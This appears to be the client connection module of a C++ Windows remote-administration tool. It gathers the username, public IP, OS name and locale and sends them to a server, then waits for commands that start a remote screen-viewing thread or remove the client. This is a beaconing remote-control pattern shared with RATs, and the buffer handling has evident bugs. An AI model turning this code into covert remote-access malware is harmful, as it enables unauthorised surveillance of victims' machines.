#include "stdafx.h"
#include "ConnectionHandler.h"
#include "RemoteView.h"
#include <codecvt>
#include <WinInet.h>
#pragma comment(lib, "WinInet.lib")


ConnectionHandler::ConnectionHandler()
{

}


ConnectionHandler::~ConnectionHandler()
{
}

void ConnectionHandler::OnConnect()
{
	int i = 0; //0 == First Connect, Tell Server you've connected and to get ready for Client Information
	send(ConnectSocket, (char*)&i, sizeof(int), 0);

	ClientDataStrings CDS = GetComputerInfo();
	//ClientDataStrings CDS = { L"pancreas", L"127.0.0.1", L"usa", L"English" };
	int size = NULL;
	wchar_t* buffer = serialize(&CDS, &size);
	size = size * sizeof(wchar_t);

	send(ConnectSocket, (char*)buffer, size, 0);
	InstructionLoop(*buffer, size);
	delete[] buffer;
	///recv(ConnectSocket, (char*)&this->MySocket, sizeof(SOCKET), 0);
	
}

ConnectionHandler::ClientDataStrings ConnectionHandler::GetComputerInfo()
{
	ClientDataStrings CDS; 
	std::wstring tmpCountry;

	wchar_t *buffer = new wchar_t[99];

	char* internetBuffer = new char[99];
	int err = GetLastError();

	DWORD BufferSize = 99;
	HKEY hKEY = NULL;
	GetUserName(buffer, &BufferSize);
	DWORD readFromURL;
	CDS.name = buffer;
	BufferSize = 99;
	HINTERNET hInternet = InternetOpen(L"Mozilla/4.0 (compatible)", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	HINTERNET hInternetURL = InternetOpenUrl(hInternet, L"http://api.ipify.org/", NULL, 0, INTERNET_FLAG_RELOAD, 0);
	err = GetLastError();
	InternetReadFile(hInternetURL, internetBuffer, 99, &readFromURL);
	internetBuffer[readFromURL] = '\0';
	std::string tempIP(internetBuffer);
	std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> strToWstr;
	CDS.IP = strToWstr.from_bytes(tempIP);
	InternetCloseHandle(hInternet);
	InternetCloseHandle(hInternetURL);
	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0, KEY_READ, &hKEY) == ERROR_SUCCESS)
	{

		RegQueryValueEx(hKEY, L"ProductName", 0, 0, (LPBYTE)buffer, &BufferSize);
	}
	RegCloseKey(hKEY);
	CDS.OS = buffer;
	//
	//ZeroMemory(buffer, 99);
	GetLocaleInfo(GetSystemDefaultLCID(), LOCALE_SENGLISHLANGUAGENAME, buffer, 99);
	CDS.Country = buffer;
	//ZeroMemory(buffer, 99);
	
	GetLocaleInfo(GetSystemDefaultLCID(), LOCALE_SENGLISHCOUNTRYNAME, buffer, 99);

	CDS.Country += '-';
	CDS.Country += buffer;
	delete[] buffer;
	delete[] internetBuffer;
	//delete[] wInternetBuffer;
	return CDS;
}
void ConnectionHandler::InstructionLoop(wchar_t& wcbuffer, int & wcSize)
{
	int Instruction = NULL;
	while (TRUE)
	{
		fd_set serverSet;
		timeval waitTime;
		waitTime.tv_sec = 0;
		waitTime.tv_usec = 10000;
		FD_ZERO(&serverSet);
		FD_SET(ConnectSocket, &serverSet);
		int sel = select(NULL, &serverSet, NULL, NULL, &waitTime);
		ULONG bytesAvailable = NULL;
		int retVal = NULL;
		if (sel < 0) break;
		if (sel > 0)
		{
			retVal = recv(ConnectSocket, (char*)&Instruction, sizeof(int), 0);
			if (retVal <= 0) return;
			switch (Instruction)
			{
			case 1: // remote view
			{
				//check if RemoteRecvSocket already holds a valid socket
				if (Remote.rData.sRecv == INVALID_SOCKET) {
					//start remote function since there is no valid socket available.	
					int creatingSocket = 0;
					send(this->ConnectSocket, (char*)&creatingSocket, sizeof(int), 0); // tell server that we are creating a socket

					Remote.rData.sRecv = socket(this->ConnectionInfo->ai_family, this->ConnectionInfo->ai_socktype, this->ConnectionInfo->ai_protocol); //create a socket
					connect(Remote.rData.sRecv, this->ConnectionInfo->ai_addr, this->ConnectionInfo->ai_addrlen); //connect to the server with this socket
					int wsaerror = WSAGetLastError();
					if (wsaerror)
						int j = wsaerror;
					

					char buffer[(sizeof(int)*3) + sizeof(SOCKET)]; //create a buffer for the message and our personal socket number
					memcpy_s(buffer,sizeof(buffer), &Instruction, sizeof(int)); //copy message to buffer
					memcpy_s(&buffer[sizeof(int)], sizeof(buffer), &creatingSocket, sizeof(int)); //copy 0 to buffer.
					memcpy_s(&buffer[sizeof(int)*2], sizeof(buffer), &ConnectSocket, sizeof(SOCKET)); // copy socket to buffer
					int numScreens = GetSystemMetrics(SM_CMONITORS); //get number of display screens
					memcpy_s(&buffer[(sizeof(int) * 2) + sizeof(SOCKET)], sizeof(buffer), &numScreens, sizeof(int));
					int check = send(Remote.rData.sRecv, buffer, sizeof(buffer), 0); //send buffer
					check = send(Remote.rData.sRecv,(char*)&wcbuffer, wcSize, 0);

					//wait for conformation to reconnect.
					BOOL sendConnect = FALSE;
					recv(Remote.rData.sRecv, (char*)&sendConnect, sizeof(int), 0);
					if (sendConnect)
					{

						//time to connect again for the send socket.
						Remote.rData.sSend = socket(this->ConnectionInfo->ai_family, this->ConnectionInfo->ai_socktype, this->ConnectionInfo->ai_protocol); //create a socket
						connect(Remote.rData.sSend, this->ConnectionInfo->ai_addr, this->ConnectionInfo->ai_addrlen); //connect to the server with this socket
						wsaerror = WSAGetLastError();
						if (wsaerror)
							int j = wsaerror;

						creatingSocket = 1;//Creating Send Socket
						ZeroMemory(buffer, (sizeof(int) * 3) + sizeof(SOCKET));
						memcpy_s(buffer, sizeof(buffer), &Instruction, sizeof(int)); //copy remote message to buffer
						memcpy_s(&buffer[sizeof(int)], sizeof(buffer), &creatingSocket, sizeof(int)); //copy 1 to buffer.
						memcpy_s(&buffer[sizeof(int) * 2], sizeof(buffer), &creatingSocket, sizeof(int)); //copy 1 to buffer.
						memcpy_s(&buffer[sizeof(int) * 3], sizeof(buffer), &ConnectSocket, sizeof(SOCKET)); // copy socket to buffer
						check = send(Remote.rData.sSend, buffer, (sizeof(int) * 2) + sizeof(SOCKET), 0); //send buffer

					}
					else
					{
						closesocket(Remote.rData.sRecv);
						Remote.rData.sRecv = INVALID_SOCKET;
						return;
					}
					
					//call remote function
					
					// = RemoteRecvSocket;
					//Remote.rData.sSend = RemoteSendSocket;

					std::thread t(&RemoteView::RemoteHandler, std::ref(Remote));
					t.detach();

				}
				else //there is already a socket. //Needs FUll REWORK
				{
					int alreadyASocket = 1;
					char buffer[sizeof(int) + sizeof(SOCKET)]; //create a buffer for the message and our personal socket number
					int sizeofbuffer = sizeof(buffer);
					memcpy_s(buffer, sizeof(buffer), &alreadyASocket, sizeof(int)); //copy message to buffer
					memcpy_s(&buffer[sizeof(int)], sizeof(buffer - sizeof(int)), &this->ConnectSocket, sizeof(SOCKET)); // copy socket to buffer
					send(this->ConnectSocket, buffer, sizeof(int) + sizeof(SOCKET), 0); //send buffer
					recv(this->ConnectSocket, (char*)&alreadyASocket, sizeof(int), 0); // wait for confirmation that this is in fact a valid socket.
					if (alreadyASocket == 0)
					{
						//RemoteRecvSocket = socket(this->ConnectionInfo.ai_family, this->ConnectionInfo.ai_socktype, this->ConnectionInfo.ai_protocol); //create a socket
						connect(Remote.rData.sRecv, this->ConnectionInfo->ai_addr, this->ConnectionInfo->ai_addrlen); //connect to the server with this socket
						int wsaerror = WSAGetLastError();
						if (wsaerror == WSAEISCONN) {
							
							closesocket(Remote.rData.sRecv);
							Remote.rData.sRecv = INVALID_SOCKET;
							//send(this->ConnectSocket, (char*)& wsaerror, sizeof(int), 0);
							break;


						}
						//send(this->ConnectSocket, (char*)& wsaerror, sizeof(int), 0);
						char buffer[sizeof(int) + sizeof(SOCKET)]; //create a buffer for the message and our personal socket number
						memcpy_s(buffer, sizeof(buffer), &Instruction, sizeof(int)); //copy message to buffer
						memcpy_s(&buffer[sizeof(int)], sizeof(buffer - sizeof(int)), &Remote.rData.sRecv, sizeof(SOCKET)); // copy socket to buffer
						send(Remote.rData.sRecv, buffer, sizeof(int) + sizeof(SOCKET), 0); //send buffer
						//call remote function
					}
					else break;
				}

				
			}
			break;
			case 2: //refresh. roll into case 3 to restart client.
				SendMessage(mainHWND, WM_COMMAND, (WM_USER + 1), NULL);
			case 3: //Client Said Remove, 
			{
				SendMessage(mainHWND,WM_COMMAND,  (WM_USER + 1), NULL);

			}
			break;
			default: //undefined behavior.. 
				break;
			}
			Instruction = -1;
		}
	}
	return;
}


wchar_t* ConnectionHandler::serialize(ClientDataStrings* cData, int *size) //Add Encryption
{
	int bufferlength = cData->name.length() + cData->IP.length() + cData->OS.length() + cData->Country.length() + 4;

	wchar_t* serBuffer = new wchar_t[bufferlength];
	int bufferoffset = 0;
	int stringLength = cData->name.length() + 1;

	for (int i = 0; i < stringLength; i++)
		serBuffer[i + bufferoffset] = cData->name[i];

	bufferoffset += stringLength;
	stringLength = cData->IP.length() + 1;
	for (int i = 0; i < stringLength; i++)
		serBuffer[i + bufferoffset] = cData->IP[i];

	bufferoffset += stringLength;
	stringLength = cData->OS.length() + 1;
	for (int i = 0; i < stringLength; i++)
		serBuffer[i + bufferoffset] = cData->OS[i];

	bufferoffset += stringLength;
	stringLength = cData->Country.length() + 1;
	for (int i = 0; i < stringLength; i++)
		serBuffer[i + bufferoffset] = cData->Country[i];
	*size = bufferlength;
	return serBuffer;
}

ConnectionHandler::ClientDataStrings ConnectionHandler::deSerialize(wchar_t* data) //Add Encryption
{
	ClientDataStrings cData;
	int bufferOffset = 0;
	for (int i = 0; data[i] != '\0'; i++)
		cData.name += data[i];
	bufferOffset += cData.name.length() + 1;
	for (int i = 0; data[i + bufferOffset] != '\0'; i++)
		cData.IP += data[i + bufferOffset];
	bufferOffset += cData.IP.length() + 1;
	for (int i = 0; data[i + bufferOffset] != '\0'; i++)
		cData.OS += data[i + bufferOffset];
	bufferOffset += cData.OS.length() + 1;
	for (int i = 0; data[i + bufferOffset] != '\0'; i++)
		cData.Country += data[i + bufferOffset];

	return cData;
}

